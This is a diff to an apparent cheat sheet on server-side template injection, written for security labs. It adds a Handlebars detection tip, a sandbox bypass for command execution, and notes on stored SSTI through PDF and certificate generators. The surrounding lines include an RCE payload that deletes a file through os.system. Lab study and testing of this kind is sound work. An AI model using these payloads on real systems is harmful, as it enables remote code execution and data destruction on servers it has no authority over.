@@ -32,6 +32,8 @@ ${7*7}    # Freemarker, Jinja2
 | `{{7*7}}` | ✓ | Tornado/Jinja2 | Python |
 | `${7*7}` | ✓ | Freemarker | Java |
 | `{{7*7}}` | ✗ (shows "7*7") | Handlebars | Node.js |
+
+> **Handlebars detection tip:** `{{7*7}}` returns literal "7*7" (not 49). Use `{{this}}` instead — returns `[object Object]` confirming Handlebars.
 | `{{7*7}}` | ✗ (shows "7*7") | Django | Python |
 | `${7*7}` | ✓ | Mako | Python |
 
@@ -83,6 +85,8 @@ user.name}}{%import os%}{{os.system('rm /home/carlos/morale.txt')
   {{/with}}
 {{/with}}
 ```
+
+> **If `require` throws ReferenceError** (sandboxed env): replace `require(...)` with `process.mainModule.require(...)` and use `execSync('cmd').toString()` for synchronous output.
 
 ### Freemarker (Java) - Lab 4
 **RCE via Execute class:**
@@ -337,7 +341,8 @@ ${expression}           # Output
 - Content management systems
 - Template editors
 - Preview functions
-- PDF generators
+- PDF generators / certificate generators
+- Invoice / receipt renderers
 
 **Parameters to Test:**
 - `template=`
@@ -346,6 +351,11 @@ ${expression}           # Output
 - `format=`
 - `message=`
 - Any user-controlled text rendered server-side
+
+**Stored / Second-Order SSTI:**
+- Payload injected in one endpoint (e.g., profile update, form field), triggered in another (e.g., PDF export, certificate generation, email send)
+- Test flow: save `{{7*7}}` in a profile/name field, then trigger any render action (download certificate, generate report, preview) and check output for `49`
+- Common pattern: user-editable fields (name, address, notes) rendered unsafely into PDF/HTML via wkhtmltopdf, WeasyPrint, or similar
 
 ---
 
